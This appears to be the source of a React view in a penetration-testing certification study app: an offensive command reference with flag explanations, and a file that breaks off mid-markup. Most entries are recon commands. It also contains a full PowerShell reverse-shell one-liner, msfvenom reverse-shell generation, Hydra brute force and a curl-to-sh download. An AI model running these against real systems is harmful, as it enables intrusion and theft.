import React, { useState, useMemo } from 'react';
import { 
  Terminal, 
  Copy, 
  Check, 
  Search, 
  Filter, 
  Plus, 
  ShieldAlert, 
  Globe, 
  Key, 
  Database, 
  Radio, 
  GitBranch, 
  Box, 
  ChevronRight, 
  ExternalLink, 
  Layers, 
  Sparkles, 
  Sliders, 
  Play, 
  Flame, 
  Zap, 
  Target,
  HelpCircle,
  Info,
  BookOpen,
  X,
  Code,
  ShieldCheck,
  FolderTree
} from 'lucide-react';
import { CommandItem, NoteItem } from '../../types';

export interface ExtendedCommandItem extends CommandItem {
  platform?: 'Linux' | 'Windows' | 'Cross-Platform';
  optionsHelp?: { flag: string; description: string; example?: string }[];
  howToUse?: string;
  expectedOutput?: string;
}

interface CommandMatrixViewProps {
  commands: CommandItem[];
  notes: NoteItem[];
  onOpenNoteInEditor: (path: string) => void;
  onSaveNewCommandNote: (title: string, tool: string, category: string, command: string, description: string) => void;
  onExecuteCommand?: (command: string) => void;
}

// Built-in Comprehensive eJPTv2 & Pentest Arsenal
const EJPT_BUILTIN_ARSENAL: ExtendedCommandItem[] = [
  // ==========================================
  // LINUX PAYLOADS
  // ==========================================
  {
    id: 'cmd-nmap-fast',
    platform: 'Linux',
    title: 'Fast TCP SYN Port Scan Across All Ports',
    tool: 'nmap',
    category: 'Recon & Network Scanning',
    command: 'nmap -sS -T4 -p- -oN all_ports.nmap <TARGET_IP>',
    description: 'Ultra-fast initial reconnaissance scanning all 65,535 TCP ports without completing 3-way TCP handshakes.',
    branch: 'certs',
    tags: ['nmap', 'recon', 'portscan', 'syn', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50', description: 'Target machine IP' }
    ],
    howToUse: 'Execute at the start of any eJPT lab or box to quickly discover all open listening ports before running heavy scripts.',
    optionsHelp: [
      { flag: '-sS', description: 'TCP SYN Stealth Scan (sends SYN packet, receives SYN-ACK, terminates with RST)' },
      { flag: '-T4', description: 'Aggressive timing template (optimizes speed on local/lab networks)' },
      { flag: '-p-', description: 'Scan all 65,535 TCP ports instead of just top 1,000' },
      { flag: '-oN <FILE>', description: 'Save output in normal human-readable text format for note taking' }
    ],
    expectedOutput: 'PORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n3306/tcp  open  mysql\n8080/tcp  open  http-proxy'
  },
  {
    id: 'cmd-nmap-detailed',
    platform: 'Linux',
    title: 'Comprehensive Service Version, OS & Default Scripts Scan',
    tool: 'nmap',
    category: 'Recon & Network Scanning',
    command: 'nmap -sC -sV -O -p <PORT> -oN detailed_scan.nmap <TARGET_IP>',
    description: 'Deep enumeration on discovered open ports to identify application banners, exact versions, OS fingerprints, and default NSE scripts.',
    branch: 'certs',
    tags: ['nmap', 'enum', 'version', 'scripts', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50', description: 'Target machine IP' },
      { name: 'PORT', placeholder: '22,80,445,3306,8080', description: 'Comma-separated open ports' }
    ],
    howToUse: 'Run after the fast scan on specific ports found open to gather exact version numbers for CVE research.',
    optionsHelp: [
      { flag: '-sC', description: 'Run default safe NSE scripts' },
      { flag: '-sV', description: 'Probe open ports to determine service and software version' },
      { flag: '-O', description: 'Enable TCP/IP stack fingerprinting for OS detection' },
      { flag: '-p <PORTS>', description: 'Specify exact port range or comma-separated ports' },
      { flag: '-oN <FILE>', description: 'Save normal output log' }
    ]
  },
  {
    id: 'cmd-arp-scan',
    platform: 'Linux',
    title: 'Local Subnet ARP Discovery',
    tool: 'arp-scan',
    category: 'Recon & Network Scanning',
    command: 'arp-scan --interface=<INTERFACE> --localnet',
    description: 'Fast Layer 2 ARP broadcast discovery mapping all live host IP addresses and MAC vendors on the local network segment.',
    branch: 'certs',
    tags: ['arp', 'recon', 'layer2', 'subnets', 'linux'],
    parameters: [
      { name: 'INTERFACE', placeholder: 'eth0', defaultValue: 'eth0' }
    ],
    optionsHelp: [
      { flag: '--interface=<IFACE>', description: 'Network interface to send ARP packets through' },
      { flag: '--localnet', description: 'Scan all IPv4 addresses in the local subnet' }
    ]
  },
  {
    id: 'cmd-enum4linux',
    platform: 'Linux',
    title: 'Full Automated SMB & Samba Enumeration',
    tool: 'enum4linux',
    category: 'Host & Service Enumeration',
    command: 'enum4linux -a <TARGET_IP>',
    description: 'Performs full enumeration of SMB shares, Windows domain/workgroup info, usernames, password policy, RID cycling, and OS details.',
    branch: 'certs',
    tags: ['smb', 'enum4linux', 'samba', 'users', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' }
    ],
    howToUse: 'Run against any host running SMB (port 139/445) to discover usernames and accessible shared directories.',
    optionsHelp: [
      { flag: '-a', description: 'Do all basic enumeration (-U -S -G -P -r -o -n -i)' },
      { flag: '-U', description: 'Get userlist' },
      { flag: '-S', description: 'Get sharelist' },
      { flag: '-P', description: 'Get password policy' }
    ]
  },
  {
    id: 'cmd-smbclient-list',
    platform: 'Linux',
    title: 'Anonymous SMB Share Listing',
    tool: 'smbclient',
    category: 'Host & Service Enumeration',
    command: 'smbclient -L //<TARGET_IP>/ -N',
    description: 'Connects with a Null session (no password) to list all available SMB network shares and printers.',
    branch: 'certs',
    tags: ['smb', 'smbclient', 'shares', 'null-session', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' }
    ],
    optionsHelp: [
      { flag: '-L //<IP>/', description: 'List shares hosted by target server' },
      { flag: '-N', description: 'Suppress password prompt (null session)' }
    ]
  },
  {
    id: 'cmd-snmpwalk',
    platform: 'Linux',
    title: 'SNMP v2c Full MIB Walk',
    tool: 'snmpwalk',
    category: 'Host & Service Enumeration',
    command: 'snmpwalk -v2c -c <COMMUNITY> <TARGET_IP> 1.3.6.1.2.1.1',
    description: 'Enumerates system info, process list, network interfaces, and installed software via SNMP port 161 UDP.',
    branch: 'certs',
    tags: ['snmp', 'snmpwalk', 'mib', 'udp', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' },
      { name: 'COMMUNITY', placeholder: 'public', defaultValue: 'public' }
    ],
    optionsHelp: [
      { flag: '-v2c', description: 'Use SNMP version 2c' },
      { flag: '-c <STRING>', description: 'Specify SNMP community string (e.g. public, private, manager)' }
    ]
  },
  {
    id: 'cmd-gobuster-dir',
    platform: 'Linux',
    title: 'Web Directory & File Fuzzing with Extensions',
    tool: 'gobuster',
    category: 'Web Application Pentesting',
    command: 'gobuster dir -u http://<TARGET_IP>:<PORT>/ -w <WORDLIST> -x php,txt,html,bak,json -t 30 -o gobuster_dirs.txt',
    description: 'Fast multithreaded directory and file fuzzing to locate hidden administrative panels and backups.',
    branch: 'certs',
    tags: ['gobuster', 'web', 'directory-fuzzing', 'wordlist', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' },
      { name: 'PORT', placeholder: '80', defaultValue: '80' },
      { name: 'WORDLIST', placeholder: '/usr/share/wordlists/dirb/common.txt', defaultValue: '/usr/share/wordlists/dirb/common.txt' }
    ],
    optionsHelp: [
      { flag: 'dir', description: 'Directory & file fuzzing mode' },
      { flag: '-u <URL>', description: 'Target base URL' },
      { flag: '-w <PATH>', description: 'Path to wordlist' },
      { flag: '-x <EXTS>', description: 'File extensions to append to each wordlist item' },
      { flag: '-t <THREADS>', description: 'Number of concurrent threads (default 10, use 30)' }
    ]
  },
  {
    id: 'cmd-ffuf-dir',
    platform: 'Linux',
    title: 'High-Performance Web Fuzzing with Status Code Filter',
    tool: 'ffuf',
    category: 'Web Application Pentesting',
    command: 'ffuf -u http://<TARGET_IP>:<PORT>/FUZZ -w <WORDLIST> -mc 200,204,301,302,307,401,403 -c -o ffuf_results.json',
    description: 'Blazing-fast Go-based web fuzzer matching HTTP response status codes.',
    branch: 'certs',
    tags: ['ffuf', 'web', 'fuzzing', 'fast', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' },
      { name: 'PORT', placeholder: '80', defaultValue: '80' },
      { name: 'WORDLIST', placeholder: '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' }
    ],
    optionsHelp: [
      { flag: '-u <URL>', description: 'Target URL with FUZZ keyword marking injection point' },
      { flag: '-w <PATH>', description: 'Wordlist path' },
      { flag: '-mc <CODES>', description: 'Match specific HTTP status response codes' }
    ]
  },
  {
    id: 'cmd-sqlmap-auto',
    platform: 'Linux',
    title: 'Automated SQL Injection & Database Enumeration',
    tool: 'sqlmap',
    category: 'Web Application Pentesting',
    command: 'sqlmap -u "http://<TARGET_IP>:<PORT>/page.php?id=1" --batch --dbs --risk=3 --level=3',
    description: 'Automates detection and exploitation of SQL injection vulnerabilities across GET/POST parameters.',
    branch: 'certs',
    tags: ['sqlmap', 'sqli', 'database', 'injection', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' },
      { name: 'PORT', placeholder: '80', defaultValue: '80' }
    ],
    optionsHelp: [
      { flag: '-u <URL>', description: 'Target URL with query parameters' },
      { flag: '--batch', description: 'Non-interactive mode' },
      { flag: '--dbs', description: 'Enumerate DBMS databases' }
    ]
  },
  {
    id: 'cmd-searchsploit',
    platform: 'Linux',
    title: 'Exploit-DB Offline Search by Service & Version',
    tool: 'searchsploit',
    category: 'Exploitation & Metasploit',
    command: 'searchsploit "<SERVICE_NAME>" <VERSION> --color -w',
    description: 'Searches local offline Exploit Database for known exploits matching exact banner versions.',
    branch: 'certs',
    tags: ['searchsploit', 'exploitdb', 'cve', 'linux'],
    parameters: [
      { name: 'SERVICE_NAME', placeholder: 'Apache', defaultValue: 'Apache' },
      { name: 'VERSION', placeholder: '2.4.49', defaultValue: '2.4' }
    ],
    optionsHelp: [
      { flag: '--color', description: 'Colorize search output' },
      { flag: '-w', description: 'Display Exploit-DB URL for each exploit' },
      { flag: '-m <EDB-ID>', description: 'Mirror exploit script to current directory' }
    ]
  },
  {
    id: 'cmd-msfvenom-linux',
    platform: 'Linux',
    title: 'Linux x64 Staged Meterpreter Reverse Shell (ELF)',
    tool: 'msfvenom',
    category: 'Exploitation & Metasploit',
    command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf',
    description: 'Generates an executable 64-bit Linux ELF reverse shell binary for target execution.',
    branch: 'certs',
    tags: ['msfvenom', 'payload', 'linux', 'reverse-shell'],
    parameters: [
      { name: 'LHOST', placeholder: '10.10.14.12', defaultValue: '10.10.14.12' },
      { name: 'LPORT', placeholder: '4444', defaultValue: '4444' }
    ],
    optionsHelp: [
      { flag: '-p linux/x64/meterpreter/reverse_tcp', description: 'Metasploit Linux 64-bit payload' },
      { flag: '-f elf', description: 'Executable ELF format' }
    ]
  },
  {
    id: 'cmd-hydra-ssh',
    platform: 'Linux',
    title: 'Hydra Multi-Threaded SSH Login Brute-Force',
    tool: 'hydra',
    category: 'Password Cracking',
    command: 'hydra -l <USERNAME> -P <WORDLIST> ssh://<TARGET_IP>:<PORT> -t 4 -V -f -o ssh_hydra_cracked.txt',
    description: 'High-speed authentication attack against SSH service with early exit on first valid credential.',
    branch: 'certs',
    tags: ['hydra', 'ssh', 'bruteforce', 'credentials', 'linux'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' },
      { name: 'PORT', placeholder: '22', defaultValue: '22' },
      { name: 'USERNAME', placeholder: 'root', defaultValue: 'root' },
      { name: 'WORDLIST', placeholder: '/usr/share/wordlists/rockyou.txt', defaultValue: '/usr/share/wordlists/rockyou.txt' }
    ],
    optionsHelp: [
      { flag: '-l <USER>', description: 'Single username' },
      { flag: '-P <PASS_LIST>', description: 'Password wordlist' },
      { flag: '-t 4', description: 'Thread count (keep 4 for SSH)' },
      { flag: '-f', description: 'Exit immediately when first valid login is found' }
    ]
  },
  {
    id: 'cmd-linpeas',
    platform: 'Linux',
    title: 'LinPEAS Automated Linux Privilege Escalation Scanner',
    tool: 'linpeas',
    category: 'Privilege Escalation',
    command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    description: 'Downloads and executes LinPEAS directly in memory to audit SUID binaries, sudo rights, cron jobs, and CVEs.',
    branch: 'certs',
    tags: ['linpeas', 'privesc', 'linux', 'automation'],
    parameters: []
  },
  {
    id: 'cmd-sudo-l',
    platform: 'Linux',
    title: 'Check Current User Sudo Privileges',
    tool: 'sudo',
    category: 'Privilege Escalation',
    command: 'sudo -l',
    description: 'Lists all commands the current user is allowed to run with root permissions.',
    branch: 'certs',
    tags: ['sudo', 'privesc', 'linux', 'gtfobins'],
    parameters: []
  },
  {
    id: 'cmd-find-suid',
    platform: 'Linux',
    title: 'Find All SUID Executables with GTFOBins Vectors',
    tool: 'find',
    category: 'Privilege Escalation',
    command: 'find / -perm -u=s -type f 2>/dev/null',
    description: 'Scans root filesystem for files with SUID bit set, executing with owner (root) privileges.',
    branch: 'certs',
    tags: ['suid', 'privesc', 'linux', 'gtfobins'],
    parameters: []
  },
  {
    id: 'cmd-chisel-server',
    platform: 'Linux',
    title: 'Chisel Reverse SOCKS5 Tunnel Server (Attacker Machine)',
    tool: 'chisel',
    category: 'Pivoting & Listeners',
    command: 'chisel server -p <LPORT> --reverse',
    description: 'Starts a high-speed HTTP/WebSocket tunnel server on attacker host to receive reverse SOCKS proxy connections.',
    branch: 'certs',
    tags: ['chisel', 'pivoting', 'socks5', 'tunnel', 'linux'],
    parameters: [
      { name: 'LPORT', placeholder: '8000', defaultValue: '8000' }
    ]
  },
  {
    id: 'cmd-nc-listener',
    platform: 'Linux',
    title: 'Netcat TCP Reverse Shell Listener',
    tool: 'netcat',
    category: 'Pivoting & Listeners',
    command: 'nc -lvnp <LPORT>',
    description: 'Standard TCP port listener awaiting incoming reverse shell connection from target machine.',
    branch: 'certs',
    tags: ['netcat', 'listener', 'reverse-shell', 'linux'],
    parameters: [
      { name: 'LPORT', placeholder: '4444', defaultValue: '4444' }
    ]
  },

  // ==========================================
  // WINDOWS PAYLOADS
  // ==========================================
  {
    id: 'cmd-win-nmap',
    platform: 'Windows',
    title: 'Nmap Windows Administration & RPC Ports Scan',
    tool: 'nmap',
    category: 'Recon & Network Scanning',
    command: 'nmap -sS -sV -p 135,139,445,3389,5985,5986 -oN windows_ports.nmap <TARGET_IP>',
    description: 'Scans key Windows management and Active Directory ports (MSRPC, SMB, RDP, WinRM).',
    branch: 'certs',
    tags: ['nmap', 'windows', 'smb', 'rdp', 'winrm'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' }
    ],
    optionsHelp: [
      { flag: '-p 135,139,445,3389,5985', description: 'Core Windows management and authentication ports' }
    ]
  },
  {
    id: 'cmd-win-smb-null',
    platform: 'Windows',
    title: 'Windows SMB Share Null Session Query',
    tool: 'smbclient',
    category: 'Host & Service Enumeration',
    command: 'smbclient -L //<TARGET_IP>/ -U "%"',
    description: 'Queries Windows SMB service without credentials to list administrative and IPC shares.',
    branch: 'certs',
    tags: ['smb', 'windows', 'shares', 'null-session'],
    parameters: [
      { name: 'TARGET_IP', placeholder: '10.10.10.50' }
    ]
  },
  {
    id: 'cmd-win-msfvenom-exe',
    platform: 'Windows',
    title: 'Windows x64 Meterpreter Executable (.exe)',
    tool: 'msfvenom',
    category: 'Exploitation & Metasploit',
    command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o payload.exe',
    description: 'Compiles a Windows x64 PE executable reverse shell for Windows targets.',
    branch: 'certs',
    tags: ['msfvenom', 'windows', 'meterpreter', 'exe'],
    parameters: [
      { name: 'LHOST', placeholder: '10.10.14.12', defaultValue: '10.10.14.12' },
      { name: 'LPORT', placeholder: '4444', defaultValue: '4444' }
    ]
  },
  {
    id: 'cmd-win-powershell-rev',
    platform: 'Windows',
    title: 'Windows Native PowerShell In-Memory Reverse Shell',
    tool: 'powershell',
    category: 'Exploitation & Metasploit',
    command: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'<LHOST>\',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
    description: 'Native in-memory PowerShell TCP reverse shell without creating executable files on disk.',
    branch: 'certs',
    tags: ['powershell', 'reverse-shell', 'windows', 'fileless'],
    parameters: [
      { name: 'LHOST', placeholder: '10.10.14.12', defaultValue: '10.10.14.12' },
      { name: 'LPORT', placeholder: '4444', defaultValue: '4444' }
    ],
    optionsHelp: [
      { flag: '-NoP', description: 'No profile' },
      { flag: '-NonI', description: 'Non-interactive' },
      { flag: '-Exec Bypass', description: 'Bypass execution policy' }
    ]
  },
  {
    id: 'cmd-win-winpeas',
    platform: 'Windows',
    title: 'WinPEAS Automated Windows Privilege Audit',
    tool: 'winpeas',
    category: 'Privilege Escalation',
    command: 'winpeas.exe quiet cmd',
    description: 'Audits Windows targets for unquoted service paths, AlwaysInstallElevated, Token privileges, and stored credentials.',
    branch: 'certs',
    tags: ['winpeas', 'privesc', 'windows', 'automation'],
    parameters: []
  },
  {
    id: 'cmd-win-token-privs',
    platform: 'Windows',
    title: 'Inspect Token Privileges (SeImpersonate & Potato)',
    tool: 'whoami',
    category: 'Privilege Escalation',
    command: 'whoami /priv',
    description: 'Checks if current user token possesses SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege for potato exploits.',
    branch: 'certs',
    tags: ['whoami', 'tokens', 'potato', 'privesc', 'windows'],
    parameters: []
  },
  {
    id: 'cmd-win-unquoted-paths',
    platform: 'Windows',
    title: 'Detect Unquoted Windows Service Binary Paths',
    tool: 'wmic',
    category: 'Privilege Escalation',
    command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
    description: 'Queries Windows Management Instrumentation to find third-party auto-starting services with spaces in path.',
    branch: 'certs',
    tags: ['wmic', 'unquoted-path', 'services', 'windows', 'privesc'],
    parameters: []
  },
  {
    id: 'cmd-win-always-install',
    platform: 'Windows',
    title: 'AlwaysInstallElevated Registry Exploitation',
    tool: 'reg',
    category: 'Privilege Escalation',
    command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
    description: 'Checks if AlwaysInstallElevated is set to 1 in both HKCU and HKLM registries, allowing any MSI installer to run as SYSTEM.',
    branch: 'certs',
    tags: ['registry', 'alwaysinstallelevated', 'msi', 'windows', 'privesc'],
    parameters: []
  },
  {
    id: 'cmd-win-cmdkey',
    platform: 'Windows',
    title: 'Saved Windows Credentials (cmdkey)',
    tool: 'cmdkey',
    category: 'Privilege Escalation',
    command: 'cmdkey /list',
    description: 'Lists stored credentials in Windows Credential Manager for runas privilege escalation.',
    branch: 'certs',
    tags: ['cmdkey', 'credentials', 'runas', 'windows', 'privesc'],
    parameters: []
  },
  {
    id: 'cmd-win-hashcat-ntlm',
    platform: 'Windows',
    title: 'Hashcat Windows NTLM & NetNTLMv2 Cracking',
    tool: 'hashcat',
    category: 'Password Cracking',
    command: 'hashcat -m 1000 -a 0 ntlm_hashes.txt <WORDLIST> -O',
    description: 'Uses GPU acceleration to crack Windows NTLM (mode 1000) or NetNTLMv2 (mode 5600) captured via Responder.',
    branch: 'certs',
    tags: ['hashcat', 'ntlm', 'responder', 'windows', 'password'],
    parameters: [
      { name: 'WORDLIST', placeholder: '/usr/share/wordlists/rockyou.txt', defaultValue: '/usr/share/wordlists/rockyou.txt' }
    ]
  }
];

export const CommandMatrixView: React.FC<CommandMatrixViewProps> = ({
  commands: propCommands,
  notes,
  onOpenNoteInEditor,
  onSaveNewCommandNote,
  onExecuteCommand,
}) => {
  // Top-Level OS Platform Filter: 'All' | 'Linux' | 'Windows'
  const [selectedPlatform, setSelectedPlatform] = useState<'All' | 'Linux' | 'Windows'>('All');
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedCategory, setSelectedCategory] = useState<string>('All');
  const [selectedTool, setSelectedTool] = useState<string>('All');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isAddModalOpen, setIsAddModalOpen] = useState(false);

  // Active Details Modal Command
  const [detailsCommand, setDetailsCommand] = useState<ExtendedCommandItem | null>(null);

  // Global Dynamic Variables
  const [globalParams, setGlobalParams] = useState<Record<string, string>>({
    TARGET_IP: '10.10.10.50',
    PORT: '80,443,8080',
    WORDLIST: '/usr/share/wordlists/dirb/common.txt',
    LHOST: '10.10.14.12',
    LPORT: '4444',
    USERNAME: 'admin',
    PASSWORD: 'password123',
    INTERFACE: 'eth0',
    DOMAIN: 'corp.local',
    DATABASE: 'webapp_db',
    TABLE: 'users'
  });

  // Local per-command parameter overrides
  const [paramValues, setParamValues] = useState<Record<string, Record<string, string>>>({});

  // New Command Modal Form State
  const [newTitle, setNewTitle] = useState('');
  const [newTool, setNewTool] = useState('nmap');
  const [newCategory, setNewCategory] = useState('Recon & Network Scanning');
  const [newPlatform, setNewPlatform] = useState<'Linux' | 'Windows'>('Linux');
  const [newCommand, setNewCommand] = useState('');
  const [newDescription, setNewDescription] = useState('');

  // Merge Built-in eJPT Arsenal with Vault Commands
  const mergedCommands: ExtendedCommandItem[] = useMemo(() => {
    const combined = [...EJPT_BUILTIN_ARSENAL];
    if (propCommands && propCommands.length > 0) {
      propCommands.forEach(pc => {
        if (!combined.some(c => c.command === pc.command || c.id === pc.id)) {
          // Infer platform if missing
          const platform = pc.tags.includes('windows') || pc.category.toLowerCase().includes('windows')
            ? 'Windows'
            : 'Linux';
          combined.push({ ...pc, platform });
        }
      });
    }
    return combined;
  }, [propCommands]);

  // Extract categories based on selected platform
  const categories = useMemo(() => {
    const pool = selectedPlatform === 'All' 
      ? mergedCommands 
      : mergedCommands.filter(c => c.platform === selectedPlatform);
    return ['All', ...Array.from(new Set(pool.map((c) => c.category)))];
  }, [mergedCommands, selectedPlatform]);

  const tools = useMemo(() => {
    const pool = selectedPlatform === 'All' 
      ? mergedCommands 
      : mergedCommands.filter(c => c.platform === selectedPlatform);
    return ['All', ...Array.from(new Set(pool.map((c) => c.tool.toLowerCase())))];
  }, [mergedCommands, selectedPlatform]);

  // Interpolate command with local overrides first, then global variables, then defaults
  const getSubstitutedCommand = (cmd: ExtendedCommandItem): string => {
    let result = cmd.command;
    const cmdParams = paramValues[cmd.id] || {};

    if (cmd.parameters && cmd.parameters.length > 0) {
      for (const p of cmd.parameters) {
        const localVal = cmdParams[p.name];
        const globalVal = globalParams[p.name];
        const val = localVal !== undefined && localVal !== '' 
          ? localVal 
          : (globalVal !== undefined && globalVal !== '' ? globalVal : (p.defaultValue || `<${p.name}>`));

        const regex = new RegExp(`<${p.name}>`, 'g');
        result = result.replace(regex, val);
      }
    }

    Object.entries(globalParams).forEach(([key, val]) => {
      const regex = new RegExp(`<${key}>`, 'g');
      result = result.replace(regex, val);
    });

    return result;
  };

  // Filter commands
  const filteredCommands = useMemo(() => {
    return mergedCommands.filter((cmd) => {
      const matchesPlatform = selectedPlatform === 'All' || cmd.platform === selectedPlatform;
      const matchesSearch =
        searchQuery === '' ||
        cmd.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
        cmd.command.toLowerCase().includes(searchQuery.toLowerCase()) ||
        cmd.tool.toLowerCase().includes(searchQuery.toLowerCase()) ||
        cmd.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        cmd.tags.some((t) => t.toLowerCase().includes(searchQuery.toLowerCase()));

      const matchesCategory = selectedCategory === 'All' || cmd.category.toLowerCase().includes(selectedCategory.toLowerCase());
      const matchesTool = selectedTool === 'All' || cmd.tool.toLowerCase() === selectedTool.toLowerCase();

      return matchesPlatform && matchesSearch && matchesCategory && matchesTool;
    });
  }, [mergedCommands, selectedPlatform, searchQuery, selectedCategory, selectedTool]);

  const handleGlobalParamChange = (key: string, value: string) => {
    setGlobalParams((prev) => ({ ...prev, [key]: value }));
  };

  const handleLocalParamChange = (cmdId: string, paramName: string, value: string) => {
    setParamValues((prev) => ({
      ...prev,
      [cmdId]: {
        ...(prev[cmdId] || {}),
        [paramName]: value,
      },
    }));
  };

  const copyToClipboard = (cmd: ExtendedCommandItem) => {
    const text = getSubstitutedCommand(cmd);
    navigator.clipboard.writeText(text);
    setCopiedId(cmd.id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleCreateCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newTitle.trim() || !newCommand.trim()) return;

    onSaveNewCommandNote(newTitle, newTool, newCategory, newCommand, newDescription);
    setIsAddModalOpen(false);
    setNewTitle('');
    setNewCommand('');
    setNewDescription('');
  };

  return (
    <div className="space-y-7 max-w-7xl mx-auto pb-16 animate-fadeIn">
      {/* Top Header Card */}
      <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-5 bg-white dark:bg-[#12151B] border border-black/[0.07] dark:border-white/[0.08] p-7 rounded-3xl backdrop-blur-xl shadow-sm">
        <div>
          <div className="flex items-center gap-2 mb-1.5">
            <span className="px-3 py-0.5 rounded-full text-[10px] font-mono font-extrabold bg-[#D4FF00] text-black tracking-wider">
              eJPTv2 ARSENAL
            </span>
            <span className="text-xs text-gray-500 font-mono">
              {filteredCommands.length} Classified Payloads & Reference Manuals
            </span>
          </div>
          <h1 className="text-2xl sm:text-3xl font-black tracking-tight text-gray-900 dark:text-white flex items-center gap-2.5">
            <Terminal className="w-7 h-7 text-[#D4FF00]" />
            Pentest Lab & Command Manual
          </h1>
          <p className="text-xs sm:text-sm text-gray-500 dark:text-gray-400 mt-1">
            Categorized offensive taxonomy partitioned by <span className="font-bold text-gray-800 dark:text-white">Linux</span> and <span className="font-bold text-gray-800 dark:text-white">Windows</span> with live parameter substitution and full <code className="text-[#D4FF00] font-mono">--help</code> flag breakdowns.
          </p>
        </div>

        <div className="flex items-center gap-3 w-full md:w-auto">
          <button
            onClick={() => onOpenNoteInEditor('01 Certifications/EJPT Certification/Payloads/📑 Payloads & Command Matrix — Master Index.md')}
            className="px-4 py-2.5 bg-black/[0.04] dark:bg-white/[0.05] hover:bg-black/[0.08] dark:hover:bg-white/[0.1] text-gray-800 dark:text-gray-200 font-bold text-xs rounded-full flex items-center gap-2 border border-black/[0.06] dark:border-white/[0.08] transition-all"
            title="Open Obsidian Master Index Note"
          >
            <FolderTree className="w-4 h-4 text-[#D4FF00]" />
            <span>Vault Index</span>
          </button>

          <button
            onClick={() => setIsAddModalOpen(true)}
            className="px-4 py-2.5 bg-[#D4FF00] hover:bg-[#C6F500] text-black font-bold text-xs rounded-full flex items-center gap-1.5 shadow-[0_0_25px_rgba(212,255,0,0.35)] transition-all hover:scale-105"
          >
            <Plus className="w-4 h-4 stroke-[3]" />
            <span>Add Custom</span>
          </button>
        </div>
      </div>

      {/* Primary OS Platform Segmented Switcher (Linux vs Windows vs All) */}
      <div className="flex flex-col sm:flex-row items-center justify-between gap-4 bg-white/60 dark:bg-[#181B22]/70 p-2.5 rounded-3xl border border-black/[0.07] dark:border-white/[0.08] shadow-sm">
        <div className="flex items-center gap-2 w-full sm:w-auto">
          <span className="text-xs font-mono font-bold text-gray-500 px-3 hidden lg:inline">
            PLATFORM:
          </span>
          <div className="flex items-center p-1 bg-black/[0.04] dark:bg-black/40 rounded-2xl w-full sm:w-auto">
            <button
              onClick={() => {
                setSelectedPlatform('All');
                setSelectedCategory('All');
              }}
              className={`flex-1 sm:flex-initial px-5 py-2 rounded-xl text-xs font-bold transition-all ${
                selectedPlatform === 'All'
                  ? 'bg-[#D4FF00] text-black shadow-[0_0_15px_rgba(212,255,0,0.3)]'
                  : 'text-gray-600 dark:text-gray-400 hover:text-black dark:hover:text-white'
              }`}
            >
              All Platforms ({mergedCommands.length})
            </button>
            <button
              onClick={() => {
                setSelectedPlatform('Linux');
                setSelectedCategory('All');
              }}
              className={`flex-1 sm:flex-initial px-5 py-2 rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition-all ${
                selectedPlatform === 'Linux'
                  ? 'bg-[#D4FF00] text-black shadow-[0_0_15px_rgba(212,255,0,0.3)]'
                  : 'text-gray-600 dark:text-gray-400 hover:text-black dark:hover:text-white'
              }`}
            >
              🐧 Linux ({mergedCommands.filter(c => c.platform === 'Linux').length})
            </button>
            <button
              onClick={() => {
                setSelectedPlatform('Windows');
                setSelectedCategory('All');
              }}
              className={`flex-1 sm:flex-initial px-5 py-2 rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition-all ${
                selectedPlatform === 'Windows'
                  ? 'bg-[#D4FF00] text-black shadow-[0_0_15px_rgba(212,255,0,0.3)]'
                  : 'text-gray-600 dark:text-gray-400 hover:text-black dark:hover:text-white'
              }`}
            >
              🪟 Windows ({mergedCommands.filter(c => c.platform === 'Windows').length})
            </button>
          </div>
        </div>

        <div className="flex items-center gap-2 w-full sm:w-auto px-2">
          <span className="text-[11px] font-mono text-gray-400">
            Synced with <code className="text-gray-600 dark:text-gray-300">My_Vault/Payloads/{selectedPlatform === 'All' ? '*' : selectedPlatform}</code>
          </span>
        </div>
      </div>

      {/* Global Variable Form Bar */}
      <div className="bg-white dark:bg-[#181B22] border border-black/[0.08] dark:border-white/[0.08] p-6 rounded-3xl shadow-sm space-y-3.5">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
